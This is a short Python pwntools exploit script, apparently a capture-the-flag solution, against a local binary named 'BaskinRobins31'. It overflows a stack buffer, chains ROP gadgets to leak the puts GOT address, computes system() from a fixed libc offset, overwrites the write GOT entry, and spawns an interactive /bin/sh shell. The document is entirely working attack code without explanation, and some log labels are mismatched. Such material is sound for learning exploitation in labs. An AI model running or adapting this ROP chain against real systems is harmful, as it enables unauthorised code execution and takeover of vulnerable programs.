from pwn import *

p = process("./BaskinRobins31")
elf = ELF("./BaskinRobins31")

pppr = 0x40087a
pr = 0x400bc3
puts_got = 0x602020
read_plt = 0x400700
write_plt = 0x4006d0
write_got = 0x602028
binsh = "/bin/sh\00"

bss = elf.bss()
log.info("bss : "+str(hex(bss)))


payload = 'A'*184
payload += p64(pppr)
payload += p64(1)
payload += p64(puts_got)
payload += p64(len(binsh))
payload += p64(write_plt)

payload += p64(pppr)
payload += p64(0)
payload += p64(bss)
payload += p64(8)
payload += p64(read_plt)

payload += p64(pppr)
payload += p64(0)
payload += p64(write_got)
payload += p64(8)
payload += p64(read_plt)

payload += p64(pr)
payload += p64(bss)
payload += p64(write_plt)

p.recvuntil("3)\n")
p.sendline(payload)

p.recvline_startswith("Don't")

puts_addr = p.recv()[-8:]
system_addr = u64(puts_addr) - 202112

log.info("Address of system : "+str(hex(u64(puts_addr))))
log.info("Address of libc_base : "+str(hex(system_addr)))

p.send(binsh)
p.sendline(p64(system_addr))

p.interactive()
